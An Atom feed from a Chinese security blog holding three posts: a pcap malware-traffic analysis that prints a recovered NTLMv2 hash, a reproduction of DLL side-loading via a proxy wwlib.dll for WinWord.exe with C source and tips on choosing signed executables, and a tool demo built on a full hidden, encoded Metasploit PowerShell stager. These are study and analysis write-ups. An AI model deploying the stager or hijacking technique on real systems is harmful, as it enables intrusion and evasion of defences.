<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2020-12-14T17:53:40.235Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>malware-traffic恶意流量包分析笔记</title>
    <link href="http://422926799.github.io/posts/daac1c3c.html"/>
    <id>http://422926799.github.io/posts/daac1c3c.html</id>
    <published>2020-12-14T16:29:00.000Z</published>
    <updated>2020-12-14T17:53:40.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>(中间停更过一段时间博客，因为懒都发星球去了。现在打算继续写)<br>翻到之前收藏的恶意流量分析练习的pcap地址，下载一个来弄弄<br><a href="https://www.malware-traffic-analysis.net/" target="_blank" rel="noopener">https://www.malware-traffic-analysis.net/</a><br>解压密码:infected<br><img src="https://s3.ax1x.com/2020/12/15/ru7id0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>wireshark打开后，我比较喜欢先统计一下所有的IP，和包里有什么协议，还有注意一下导出分组里的内容。<br>导出对象<br><img src="https://s3.ax1x.com/2020/12/15/ru7mQJ.png" alt=""><br>IP统计<br><img src="https://s3.ax1x.com/2020/12/15/ru7wwt.png" alt=""><br>协议分级<br><img src="https://s3.ax1x.com/2020/12/15/ru7ny9.png" alt=""></p><p>从上图可以得到以下几点信息：</p><ul><li>存在HTTP、SMB、LDAP、DNS流量</li><li>SMB和LDAP流量占多</li><li>源IP访问的目标IP端口</li></ul><p>看了一下HTTP流量，发现是下载了三个文件<br><img src="https://s3.ax1x.com/2020/12/15/ruHA0I.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruHZAP.png" alt=""></p><p>尝试过提取出来，发现并不行。失败了，将pcap上传到<img src="https://pcap.zhouhe.360.cn/" alt="宙合列表">发现VT上有样本<br><img src="https://s3.ax1x.com/2020/12/15/ruL2CV.png" alt=""></p><p>三个都免杀，但是看了一下VT的检测结果。发现没有任何外连(不排除判断是否在虚拟机里运行，是的话直接ExitProcess)<br>查询结果：<a href="https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog" target="_blank" rel="noopener">https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog</a><br><img src="https://s3.ax1x.com/2020/12/15/ruLfvF.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruL4u4.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruL5DJ.png" alt=""></p><p>HTTP流量到这里貌似也没啥好追的了，看了一眼TLS也没啥异样<br><img src="https://s3.ax1x.com/2020/12/15/ruLH4x.png" alt=""></p><p>然后把目光转向smb，发现存在个域。使用Kerberos TGT访问的域控<br><img src="https://s3.ax1x.com/2020/12/15/ruLXvD.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruLOgO.png" alt=""></p><p>看了一下成功认证smb后访问过的文件和文件夹，也没有干啥<br><img src="https://s3.ax1x.com/2020/12/15/ruOpVA.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruOC5t.png" alt=""></p><p>后面用NTLMRawUnHide从数据包里提取出了一个NTLM<br><img src="https://s3.ax1x.com/2020/12/15/ruOF8f.png" alt=""></p><p>至此信息如下：</p><pre><code>HTTP------------domain:t497sword.com - 5.44.3.72 4- 俄罗斯莫斯科download.windowsupdate.com - 72.21.81.240 - 美国ctldl.windowsupdate.com -67.24.185.254 - 美国SMB-------------\\MRNATURAL.INFO\IPC$\\MrNatural-DC.mrnatural.info\IPC$info--------------10.12.1.101 hostname:Lenovo_2b Mac:10:c5:95:2b:13:0510.12.1.2 hostname:Dell_99 Mac:00:11:43:99:de:87[1;37mFound NTLMSSP Message Type 3 :[1;32m Authentication[0;37m    [1;34m&gt;[1;37m Domain                 :[0;97m MRNATURAL [0;37m    [1;34m&gt;[1;37m Username               :[0;97m fabulous.dale [0;37m    [1;34m&gt;[1;37m Workstation            :[0;97m DESKTOP-NATURAL [0;37m[1;37mNTLMv2 Hash recovered:[0;97mMRNATURAL\fabulous.dale::DESKTOP-NATURAL:100dd7adfc69d6a4:2a6c2ec69501afb83ce01d54e115314f:0101000000000000d0521c723bc8d601e8b8829daacf831700000000020012004d0052004e00410054005500520041004c00010018004d0052004e00410054005500520041004c002d004400430004001c006d0072006e00610074007500720061006c002e0069006e0066006f00030036004d0072004e00610074007500720061006c002d00440043002e006d0072006e00610074007500720061006c002e0069006e0066006f0005001c006d0072006e00610074007500720061006c002e0069006e0066006f0007000800d0521c723bc8d60106000400020000000800300030000000000000000000000000200000764598ededc17516e4c2b0bf2070ee5ff48e1dbf474b9cf30823f0967cb02e2e0a001000000000000000000000000000000000000900260063006900660073002f004d0052004e00410054005500520041004c002e0049004e0046004f000000000000000000</code></pre><p>后面追踪主机名，看到LDAP查询的内容</p><pre><code>&quot;DC=mrnatural,DC=info&quot;&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;&quot;CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=mrnatural,DC=info&quot;&quot;cn=policies,cn=system,DC=mrnatural,DC=info&quot;&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;</code></pre><p><img src="https://s3.ax1x.com/2020/12/15/ruOZrQ.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruOebj.png" alt=""></p><p>后面对着每个IP都检查了一下，发现可疑也就http流量的那三个。其他都无异样，后面去微步社区查了一下找到了以下信息<br><img src="https://s3.ax1x.com/2020/12/15/ruOQP0.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruO12T.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruOlGV.png" alt=""></p><p>至此也没什么好弄的，，，可能还有一些别的没发现吧。太菜了<br>以下微步社区和分析的链接：<br><a href="https://x.threatbook.cn/nodev4/ip/72.21.81.240" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/72.21.81.240</a><br><a href="https://x.threatbook.cn/nodev4/ip/67.24.185.254" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/67.24.185.254</a><br><a href="https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;(中间停更过一段时间博客，因为懒都发星球去了。现在打算继续写)&lt;br&gt;翻到之前收藏的恶意流量分析练习的pcap地址，下载一个来弄弄&lt;br&gt;&lt;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>白加黑wwlib.dll复现</title>
    <link href="http://422926799.github.io/posts/7b49de5f.html"/>
    <id>http://422926799.github.io/posts/7b49de5f.html</id>
    <published>2020-12-04T06:39:36.000Z</published>
    <updated>2020-12-04T06:50:39.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今日看到某分析文章，利用word的wwlib.dll实现白加黑。虽然这个操作很早就有了，翻了一下笔记发现没有测过，实验一波并做测试</p><h2 id="白加黑概念"><a href="#白加黑概念" class="headerlink" title="白加黑概念"></a>白加黑概念</h2><p>白exe，黑dll<br>所谓白exe指拥有数字签名的exe，数字签名也分三六九等。大厂的签名一般都很不错，WinWord.exe的数字签名即为微软的数字签名<br><img src="https://s3.ax1x.com/2020/12/04/DbiDEV.png" alt=""></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>将WinWord.exe拖入IDA分析，追踪LoadLibraryW函数可以看到有几个调用<br><img src="https://s3.ax1x.com/2020/12/04/DbiggJ.md.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/04/DbifD1.md.png" alt=""></p><p>个人测试<br>（由于IDA不在虚拟机，直接把winword拖出到物理机看，和文章所测试的并不相同）<br><img src="https://s3.ax1x.com/2020/12/04/Dbio4O.md.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/04/Dbi7CD.png" alt=""></p><p>IDA不行的话<br>作者给出的其他的方法：<br>如果无法使用IDA静态分析我们可以使用API监控软件来观察，如火绒剑或API Monitor，当然也可以使用OD下断点来分析。（这里和使用IDA没什么区别，不同的PE文件用不同的方式来达到最好的效果）</p><p>OD断点LolibraryW，可以发现加载的wwlib.dll和其调用wwlib.dll内的函数<br><img src="https://s3.ax1x.com/2020/12/04/Dbijbt.png" alt=""></p><p>目前所知道的内容：</p><pre><code>* 加载的wwlib.dll    * 调用Fmain函数    * 调用wdCommandDispatch函数    * 调用wdGetApplicationObject函数</code></pre><p>利用手段：</p><pre><code>* vs自己写dll，实现调用的三个函数* msf直接生成个dll，在dllmain函数直接实现劫持</code></pre><p>wwlib.dll导出函数<br><img src="https://s3.ax1x.com/2020/12/04/DbFivj.png" alt=""></p><p>其实wwlib.dll可以拖入到IDA分析导出函数，然后在编写。由于这里测试的时候出现了点问题，直接拿文章给出的图按着构造即可</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) int FMain(int a, int b, int c, int d);extern &quot;C&quot; __declspec(dllexport) void wdCommandDispatch();extern &quot;C&quot; __declspec(dllexport) void wdGetApplicationObject();//extern &quot;C&quot; __declspec(dllexport) void DllCanUnloadNow(); //确定是否正在使用实现此功能的DLL。如果不是，则调用者可以从内存中卸载DLL。,不能重新定义//extern &quot;C&quot; __declspec(dllexport) void DllGetClassObject();//extern &quot;C&quot; __declspec(dllexport) void DllGetLCID();int FMain(int a,int b,int c,int d) {        MessageBoxA(0, &quot;test&quot;, &quot;test&quot;, MB_OK);        exit(0);        return 1;}void wdCommandDispatch() {}void wdGetApplicationObject() {}BOOL APIENTRY DllMain(        HINSTANCE hinstDLL,  // handle to DLL module        DWORD fdwReason,     // reason for calling function        LPVOID lpReserved)  // reserved{        // Perform actions based on the reason for calling.        switch (fdwReason)        {        case DLL_PROCESS_ATTACH:               // Initialize once for each new process.               // Return FALSE to fail DLL load.               break;        case DLL_THREAD_ATTACH:               // Do thread-specific initialization.               break;        case DLL_THREAD_DETACH:               // Do thread-specific cleanup.               break;        case DLL_PROCESS_DETACH:               // Perform any necessary cleanup.               break;        }        return TRUE;  // Successful DLL_PROCESS_ATTACH.}</code></pre><p>x86生成dll，替换掉原来的wwlib.dll即可看到定义的弹框<br><img src="https://s3.ax1x.com/2020/12/04/DbFM24.png" alt=""></p><p>注意事项:<br>写好对应要劫持的dll函数生成后，注意原来dll的位数。不要原本是x86生成个x64，那铁定跑不了。（tm我在这踩了一个小时的坑，xswzj）</p><p>dllmain函数处劫持（在DllMain中DLL_PROCESS_ATTACH选项下（每次加载DLL首先执行的地方））<br><img src="https://s3.ax1x.com/2020/12/04/DbF8q1.png" alt=""></p><p>实现劫持dll并使得winword正常运行，像上面粗暴的方法去定义dll函数。然后等着exe去执行，返回预期不一致的话导致exe无法正常运行退出。使得恢复exe正常运行最简单的方法就是把原来的dll改名，然后在调用处调用dll的函数（仅限于可以看见调用的导出函数）</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) int FMain(int a, int b, int c, int d);extern &quot;C&quot; __declspec(dllexport) void wdCommandDispatch();extern &quot;C&quot; __declspec(dllexport) void wdGetApplicationObject();//extern &quot;C&quot; __declspec(dllexport) void DllCanUnloadNow(); //确定是否正在使用实现此功能的DLL。如果不是，则调用者可以从内存中卸载DLL。,不能重新定义//extern &quot;C&quot; __declspec(dllexport) void DllGetClassObject();//extern &quot;C&quot; __declspec(dllexport) void DllGetLCID();typedef int(*run)(int a,int b,int c,int d);int FMain(int a,int b,int c,int d) {        MessageBoxA(0, &quot;test&quot;, &quot;test&quot;, MB_OK);        HMODULE v1 = LoadLibraryA(&quot;WWLIBS.DLL&quot;);        run v2 = (run)GetProcAddress(v1,&quot;FMain&quot;);        return v2(a,b,c,d);}void wdCommandDispatch() {}void wdGetApplicationObject() {}BOOL APIENTRY DllMain(        HINSTANCE hinstDLL,  // handle to DLL module        DWORD fdwReason,     // reason for calling function        LPVOID lpReserved)  // reserved{        // Perform actions based on the reason for calling.        switch (fdwReason)        {        case DLL_PROCESS_ATTACH:               // Initialize once for each new process.               // Return FALSE to fail DLL load.               break;        case DLL_THREAD_ATTACH:               // Do thread-specific initialization.               break;        case DLL_THREAD_DETACH:               // Do thread-specific cleanup.               break;        case DLL_PROCESS_DETACH:               // Perform any necessary cleanup.               break;        }        return TRUE;  // Successful DLL_PROCESS_ATTACH.}</code></pre><p>效果如下<br><img src="https://s3.ax1x.com/2020/12/04/DbFrqI.gif" alt=""></p><p>文章中重点:<br>如何发现存在DLL劫持漏洞的新可执行文件<br>其实网络世界中存在大把存在DLL劫持漏洞的应用程序，那么我们该如何选择对应的可执行文件呢？<br>1.独立的EXE文件来调用恶意DLL。（独立EXE必须为合法的白文件）<br>2.独立的EXE文件必须具有数字签名，并且该数字证书不会在短期内过期。<br>3.数字签名最好包括微软的数字签名。<br>4.独立的EXE必须使用Load来加载DLL且没有验证DLL。</p><p>防御与总结<br>首先对该类型的攻击有以下几个比较好的方法去防御。<br>1．可以检查网络连接异常的进程：首先我们可以将正常的网络通信进程链进行记录，当发现该进程的网络活动与记录的进程链不符时，则可能受到了DLL劫持攻击。<br>2．在加载DLL时，先将文件读入内存中验证其数字签名或是哈希值，发现不匹配则不加载该DLL。<br>3．当然Microsoft提供了一些关于DLL安全性和针对DLL劫持漏洞的相关文档。</p><p>参考链接:<a href="https://www.freebuf.com/articles/system/227824.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/227824.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;今日看到某分析文章，利用word的wwlib.dll实现白加黑。虽然这个操作很早就有了，翻了一下笔记发现没有测过，实验一波并做测试&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DerbyCon工具使用</title>
    <link href="http://422926799.github.io/posts/9b2537f1.html"/>
    <id>http://422926799.github.io/posts/9b2537f1.html</id>
    <published>2020-11-11T08:45:36.000Z</published>
    <updated>2020-11-11T09:24:03.343Z</updated>
    
    <content type="html"><![CDATA[<p>这是PCsXcetra计划在2019年的Derbycon演讲中发布的一组工具，用于快捷的分析一下shellcode或者powershell/混淆解码等<br>仓库地址：<a href="https://github.com/PCsXcetra/DerbyCon-2019Files" target="_blank" rel="noopener">https://github.com/PCsXcetra/DerbyCon-2019Files</a></p><h2 id="分析示例"><a href="#分析示例" class="headerlink" title="分析示例"></a>分析示例</h2><p>msf直接生成两个作为样本bin和psh-cmd</p><p>Extract-IP-From-Meterpreter-ShellCode.exe - 分析shellcode获得其中里面的ip和port。（只适用于msf的shellcode，可以把exe/bin文件的hex提取出来然后去执行）<br><img src="https://s1.ax1x.com/2020/11/11/BjcKf0.png" alt="shellcode raw"></p><p><img src="https://s1.ax1x.com/2020/11/11/Bjc3XF.png" alt="获取ip and port"></p><p>Base64EncoderDecoder.exe - base64解码（适用于powershell那种base64编码的）<br>psh-cmd</p><pre><code>%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAEYAaAAvAHEAMQA4AEMAQQA3AFYAVwBiAFcAKwBiAFMAQgBEACsAbgBFAGoAOQBEADYAaQB5AFoARgBBAGMAZwAxAE0AMwA1ADQAdABVADYAUQBCAEQAagBHAHQAUwBFADIAegBzADIARwBlAGQAQwBDAHkAdwA5AGIATAA0AFkASQBsAE4AZQB2ADMAdgBOADIAdgBqAE4ARgBYAFQAcQBqADMAcABFAEIATAA3AE0AaQAvAFAAUABEAE8ANwBRADEAVABTAGcATwBHAE0AQwBxAHcAbgBmAEgAcAAxAGUAagBMADIAYwB6ADgAVgB4AEUAYgBzAFAAYgBhAEUAQgBqAEkAZAA2AGUAUQBFAGwAaAB0AFYAZgBoAE0ASwA3AHcAUgB4AHEAVwA0ADIALwBTAHoAMQBNAFYAMQBkAFgAZQBsAGwAbgBpAFAASwBEAHYAUAAyAE4AVwBKAHEAVQBhAEQAMABuAG0AQgBVAGkASgBMAHcAagB6AEIATABVAEkANwBPAFAAOQB4AC8AUgBBAEUAVABQAGcAbQBOAHYAOQByAFgASgBMAHYAMwBTAFMAMQBXADYAWAA2AFEASQBPAEYAYwBwAFMASABmAEcAMgBXAEIAegA2AEcAMAAzAFEAMwBCAFQARwB6ACsAKwBXAGQAVABXAHAANQAzAFYAbQAzAGoANwA5AEkAbgBoAGQAaAAwAHEANABLAGgAdABCADAAUwAwAHAAUwBFAHoAeABKADMATwBLAGsAMgBTAEcAegBhAE8ATQBpAHoASQBvAHQAWQBlADQAYgBwAG0ANAB2ADIAbABCAFoAKwBoAEcANwBBADIAZwBPAHkARQBVAHUAeQBzAEcAaABLAEUAQQBXADgATwBXAEoAbABUAG8AVgA5AFAATgB6AEEAWQBWAHQAcwB3AG4AQwBjAFoANABFAGEAaABqAGsAcQBpAG0AWgBMAFcASABMAFQAeQA5AFgAcQBEADMARgBaACsANwAwAHQASwBjAE0AcABhAGwAdQBVAG8AVAB6AGIAdQBDAGgALwB3AEEARQBxADIAZwBPAGYAaABnAFQAZABvAG0AZwBGAFcAaQA3AEwATQBZADEAWABrAGcAUgBpAEQAOQBrAGEAaQBRADEAYQBFAHQASQBTAGYAcwBXAE0AZQBJAE8AMgBSADkAWgArAFYAawBsADgAcgBnAFIAUwBZADUAWgBMAEwAYwBqAGoAQwAzAEgAYQBXAFYAZwBTAGQATgBCAHMAdgBnAEMAVQA1ADEANgBDAHAAOAA0AC8ARQBQAGYANQAxAGUAbQByADAAKwBoAFkASwBWAHYAcgBlAGEAWABBADYARwBTADUASAB5AE8AQQBKAG8ANgB6AEEAdQArAGwAMwBnAGwASwBTADcARABCAGkAYwArAHkAdgBJAEoAcABZADUASwBYAFMARgBvADkARQBTAHMAMAA0AHAAMwBmACsAcgA1ADYANQB5AGcATABrAHEAbgBuAFgAVgA3AEEAMgB0AEwATABjAEwAZwBDAG4AVABxAGIAagBSAFEAaAB6AGUAVQBiADMAeQAvAEwAUABvAG8AdwBSAGYAMgBLACsAaQBrAE8AagBwAFUAbgB2AHMAUQB4AGkAZwBqAGEAaAA5AGcAKwBpAHQAMABBAEwATABGAFoAYgA2AEMAdwBqAHcAaQBLAGYAYwBaAFoANAA2AG4AKwBSAHMAMQBJAE0AWAB2AFMAMQBVAHAATQBRAHAAUwByAEEAZQBTAHAAQQBGAFMAUQBRAHUAbAByAE0ASQBkAEUAaQBFADIATAAyAGkAZwBGAGsAZwA1AHoAcQBMADEARwBCAFAAVwBPAGoAdABKADEAagBWAGQASAA3ADMAdwBPAFEAawAyAGQAKwBFAFgAUgBFAHMAWQBsAEgATABpAGcASgBiAGoASQBKAHkAaABzAEMAUwBvAHQAYwBMADIAbABsAGkAegBiAEQANQB0AGYANABOAG8AbABZAFQAagB3AEMAMwBZADAAdAA1AEsAZQBpAEsAdwBkADYAaABrAHQAVwBGADQARwBrAEQAZwBJAGYAdQBKAHUAVQBJAEIAOQB3AHIAbABvAEMAUQBNAGMASQBxADEAeQBjAFgAeAAwADMASAB5AFIAQwBkADAAbgBCAE0ANABCAFcASABxAEEAVABNAEEASwBaADgAQgBsAHYAQgB4AHkAdwBNAGgAVABMADcAVgBkAHgASwB4ADAAUQAxAEEASwBJAHYAdQBUAGIAeABJAC8AaABuAE4AZQBGAC8AdQArAGYAUAB3AFkAaABjADEAdgBFAEIANgByACsAVgBDADYAbgBJAHcAagBDADgALwB3AFEAWQBaAGQAawByAEcAVwA0AE8ARwBjAHcAUQAzAEMAaQBkADAAWAAwAG4ALwB5AC8AKwB6AHUATwBDAEQAUgBjADEAUQBuAFEAegB3AGUAawBhAFYAVwBNAFYANwBhAEQAWgByAHkAbQBxAHgAcAAyAFoATwBRAE0AeQBEAEEAegBMAE4AVQA4AHcAdAAwADIAVAAxAGMARQArAEoAcgAyAGMARAA5AHQAKwBOACsAOQBxAGoAQwBZADUAaQAzAGoAcQBlADUAVQAyADkAaAAyAGUARwBRAHUAQgBaAHoANwB3AHcAOABtAGkAYQBKAGgAVAB0AFcARABQAE4AcQBhAHMAUgBqAHAAbQB6AGUAVAB5AGEARABvAGQAcwBmAHEASABsAC8AbAAwAFMAcQBWAFYAagBHAFEASwB1AGMAagBxAFkARwBBAC8AeQBiAE4AOQBTAG0AVQA5AEQARAArAHMAagA1AHUATABQAFUAVQBFAHYAagBlAFgAeQBuAGIANgAxAHgATQByAGYAQQBrAFQANgBLAHIAUgBpACsAbQBwAFUARQBtAHIASgBRAFkAawAwAHgAOQBaAEcAcgBKAFEAWgBXADEATgBoADEAQgBrADYAMwBzADcARABrAEgAdABIAHcAbwAyAHUANQA2AG0ARAAyADUATwAvAEoAagA5AEgAdABEAHUAYQA3AGkAWABwAGoARAA5AFgARQAvAEIAQwBhAG4AUQB0AHoAcgA3AC8AbQArAG8AdgAxADkAYQBoAHYANwBPAGMAQgBuAHoAdAAzAGgAWQBFAE4AOABHAE8AWQBkADQANgBYAG8ASgBtADMAMABXAGEARwB1AFgAQwA4AGoAUgBXAGYAYgBXAFAASABHADgAbABkAE0AOQBGAGcAMwBjAEsANwAwAGMAYQBWADQAZQBsADAAaABnADgAMABmAEwAUgBKADcAOQBFAEcAdQBJADYAMwBHAEcASwAwAHMARwBKAFUAeABhAHEAagBxAHUANABkAEoAZQA3ADkAVgBsAGMAMQBNADkAaQArAFQAMwBiAHIAcQBUAG0ARgB0AGYAWABFAG8AagB2AG4AZgBtAE8ASAAxAGQAMQBBAC8AdAAyAHoATQBkAHAAawBxAG0ATwBvAHEAawBuAGcAVABLAGEAcQB2ACsAMwBMAG4AVgBuADIAMwB2AEgAZQBPAGwATgBEADIAVgBWAFQAWgBiAGMAMQBQAHMAcABiAEEAdwArADMANgAvAG8ANwB2AGIANgA4AGoATwBXAG8ATwA1AFkAOQAxADYASQBEAFAAOQBFAEEAYgB6AFgAcwByAHYASAB3AEQAUABaAFMAMwAxAFAAdQBJAHQAbgBqAC8ATwBsAHIASwBqAC8AUwBPAGIAawBjADIAbgB0AE8ASQBSADQASABkAEQARABuAHoASQA5AHYAUQBlACsAZwBvAHoASgBxAHoAVwBYAFoAaQArAFYAWQBqAFkAaABuAHgAVAAwAG4AbgBtAGYAMAB3AGwAKwBEADcAVgBtAHMAQQBrAEsASQBFAFgASQBkAEQAUwAwADcAQQBLAHcARQByADYAZABuAGMANwBrAHoAQgBUAHgASwBPAHQAdwBwAEgARwBzADYANwBJAEcAOQBpAC8AVQBMAE4AdAAwAEUAdQBBADAAWAB2AHEAcAB4AEgATgByAHMATwBsAE4AbgA2ACsAdABMAHYAZQBxAE4AYgBZAGoARAA2ADQAQgBOADYAcABXAFQAMgBRAEIAcwBBAHUAWgB5ADMAZQBNADAAUQAzADcANwByAGsANgB2AFgAVwB0ACsARQBkADcAZgBhAHYASgBaAGUATwBmAEgAMgBzAEkATgBJAHIAMAAzAG0AbQBIAHYAUQBmAFoAZQA4AHkATQBBAFoANgBCAFIAUABHADYANwBuAFcAZgBGAC8AYgAzAEcAWgBQAHQANQBrAGYAZwBFAGkAaAA0ADYAegB2AEcAcQBNAGIAUABjAHIATAB2AEkATwBNAE4AYwBRAHgAVABoAHYAMgBPAE4AYwBvAG8ASQA5AEcAMwBvADcATQBmAEQAcQBoAEsAUwBCAGIAeQBEAFEAYgBlAEIAMwBuAG4AbwBhAEwAegBCAFQAbQBIADQANQB1AEwARgBrAFMAUQA4AEMAVQBwAGYAKwB0AHAAeAA2AGUAcABxAEEAUQBqAGgANwBOAE8AMABQAFUASQAwAFoAawBsAEwAMgBiADEAUgBGAEcAaABUAHkAcQA2AHIAUQBJAEEALwBIADUATwBlAGIAUwBwAG8AbQBHAG0ATABOADcAawBEAEoAdwBmAEQAWgBHADkAWQA0AHAAZABCAEkANQByAE4AdwAvACsAVABxAGYAbwBDAFMAdQBBAFQALwBwAGkAcABMADIAcwAvADIAUAAwAHAAOQBwAFIAVwBIAGUAMAAzADYAMQA4AHYALwBCAEsAYgB2AHgAagAzAHoATQBjAE0ANQBGAHkANABRAEEAawA2AHQAUABDAFgAdwBxADkAcgA0AHQAawBQAEQAawA4AEkANQBEAHkAcQBIAC8ANgBIACsAcQBGAGsANQB6AGYAdwAzAC8AUABxADkARgAvAEMAWABSAFQAbwBDAFEAcwBBAEEAQQA9AD0AJwAnACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA</code></pre><p>base64解码一波<br>Base64EncoderDecoder.exe - base64解码（适用于powershell那种base64编码的）<br><img src="https://s1.ax1x.com/2020/11/11/BjgiNR.png" alt=""></p><p>PS-Light-Format.exe - powershell代码美化<br><img src="https://s1.ax1x.com/2020/11/11/BjgTxK.png" alt=""></p><p>美化后的psh</p><pre><code class="powershell">if([IntPtr]::Size -eq 4){$b=$env:windir+&#39;\sysnative\WindowsPowerShell\v1.0\powershell.exe&#39;}else{$b=&#39;powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object 